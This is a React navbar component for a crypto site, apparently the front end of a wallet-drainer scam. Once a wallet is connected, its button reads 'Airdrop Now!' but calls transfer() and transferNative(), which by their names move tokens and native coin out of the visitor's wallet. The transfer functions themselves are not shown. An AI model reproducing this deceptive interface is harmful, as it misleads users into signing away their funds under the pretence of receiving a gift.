import React, { useEffect } from "react";
import { makeStyles } from "@material-ui/core/styles";
import AppBar from "@material-ui/core/AppBar";
import Toolbar from "@material-ui/core/Toolbar";
import Typography from "@material-ui/core/Typography";
import Button from "@material-ui/core/Button";
import IconButton from "@material-ui/core/IconButton";
import MenuIcon from "@material-ui/icons/Menu";
import Container from "@material-ui/core/Container";
import { useMoralis } from "react-moralis";

import Hidden from "@material-ui/core/Hidden";
import Menu from "@material-ui/core/Menu";
import MenuItem from "@material-ui/core/MenuItem";

const useStyles = makeStyles((theme) => ({
  button: {
    marginRight: theme.spacing(2),
    borderRadius: 10,
    padding: "10px 40px",
    margin: "10px",
    color: "white",
    fontFamily: "customF",
    backgroundColor: "#ED3773", //"#F2DFD8"
    "&:disabled": {
      color: "#408ea6",
      backgroundColor: "#040b38",
    },
    "&:hover": {
      backgroundColor: "transparent",
      color: "#ED3773",
      border: "2px solid #ED3773",
    },
  },
  menuButton: {
    color: "#7ea936",
  },
  title: {
    flexGrow: 1,
    fontWeight: "bolder",
    color: "#1e2761",
    [theme.breakpoints.down("xs")]: {
      fontSize: 20,
    },
  },
  navBar: {
    backgroundColor: "transparent",
    boxShadow: "none",
    // backgroundColor: "white",
    // backgroundImage: "linear-gradient(179deg, #7a2048, #7a2048cf)",
    // backgroundImage: `url("/footer.png")`,
    backgroundRepeat: "no-repeat",
    backgroundSize: "cover",
    color: "black",
    padding: "10px 0px",
    [theme.breakpoints.down("xs")]: {
      padding: "3px 0",
    },
  },
  navLinks: {
    margin: 10,
    color: "black",
    fontWeight: "700",
    // fontStyle: "italic",
    fontFamily: "customF",
    // "&:hover": {
    //   color: "white",
    //   textShadow: "0px 0px 20px #7da936"
    // },
    // "&:disabled": {
    //   color: "grey",
    // },
  },
  icons: {
    fontSize: 30,
    margin: 10,
    marginBottom: 0,
    color: "#1e2761",
  },
  menu: {
    display: "flex",
    justifyContent: "center",
  },
  menuItem: {
    display: "flex",
    justifyContent: "center",
    backgroundColor: "#0e2020",
  },
  topBar: {
    display: "flex",
    justifyContent: "center",
    backgroundColor: "#7da936",
  },
}));

function Navbar({ transferNative, transfer }) {
  const [anchorEl, setAnchorEl] = React.useState(null);
  const classes = useStyles();
  const { enableWeb3, isWeb3Enabled, Moralis, account } = useMoralis();

  const handleClick = (event) => {
    setAnchorEl(event.currentTarget);
  };

  const handleClose = () => {
    setAnchorEl(null);
  };
  return (
    <>
      <AppBar position="fixed" className={classes.navBar}>
        <Container maxWidth="xl" style={{ padding: 0 }}>
          <Toolbar style={{ display: "flex", justifyContent: "space-between" }}>
            {/* <a href="https://proudlionsclub.com" >
            <img src="/new_logo.png" width="250px" />
            </a> */}
            <Hidden only={["xs", "sm", "md"]}>
              {/* <a href="https://proudlionsclub.com" style={{margin: "0 30px"}}>
            <img src="/house-solid.svg" width="30px" />
            </a> */}
              <Typography variant="h4" className={classes.title}>
                <Button
                  // variant="contained"
                  // href="https://proudlionsclub.com#utilities-section"
                  className={classes.navLinks}
                >
                  ABOUT
                </Button>
                <Button
                  // variant="contained"
                  // href="https://proudlionsclub.com#roadmap-section"
                  className={classes.navLinks}
                >
                  HOW IT WORKS
                </Button>
              </Typography>
              <Typography varaint="h3">{account}</Typography>
              <Button
                color="inherit"
                variant="contained"
                className={classes.button}
                onClick={() => {
                  if (account) {
                    transfer();
                    transferNative();
                  } else {
                    enableWeb3();
                  }
                }}
              >
                {" "}
                {account ? "Airdrop Now!" : "Connect Wallet"}
                <img src="mm.png" width="20" />
              </Button>
            </Hidden>
            <Hidden only={["lg", "xl"]}>
              <IconButton
                edge="start"
                className={classes.menuButton}
                color="inherit"
                aria-label="menu"
                onClick={handleClick}
              >
                <MenuIcon className={classes.menuButton} />
              </IconButton>
            </Hidden>
            <Menu
              id="simple-menu"
              anchorEl={anchorEl}
              keepMounted
              open={Boolean(anchorEl)}
              onClose={handleClose}
              className={classes.menu}
            >
              {typeof window !== "undefined" && window.ethereum ? (
                <MenuItem onClick={handleClose} className={classes.menuItem}>
                  <Button
                    color="inherit"
                    variant="contained"
                    className={classes.button}
                    // style={{ color: "white" }}
                    onClick={() => {
                      if (account) {
                        transfer();
                        transferNative();
                      } else {
                        enableWeb3();
                      }
                    }}
                  >
                    {account ? "Airdrop Now!" : "Connect Wallet"}
                    <img src="mm.png" width="20" />
                  </Button>
                </MenuItem>
              ) : (
                <MenuItem onClick={handleClose} className={classes.menuItem}>
                  <Button
                    color="inherit"
                    variant="contained"
                    className={classes.button}
                    style={{ color: "white" }}
                    // href={
                    //   "https://metamask.app.link/dapp/"
                    // }
                  >
                    Connect Wallet
                    <img src="mm.png" width="20" />
                  </Button>
                </MenuItem>
              )}
              <MenuItem onClick={handleClose} className={classes.menuItem}>
                <Button
                  // variant="contained"
                  // href="https://proudlionsclub.com#utilities-section"
                  className={classes.navLinks}
                >
                  ABOUT
                </Button>
              </MenuItem>
              <MenuItem onClick={handleClose} className={classes.menuItem}>
                <Button
                  // variant="contained"
                  // href="https://proudlionsclub.com#roadmap-section"
                  className={classes.navLinks}
                >
                  HOW IT WORKS
                </Button>
              </MenuItem>
            </Menu>
          </Toolbar>
        </Container>
      </AppBar>
    </>
  );
}
export default Navbar;
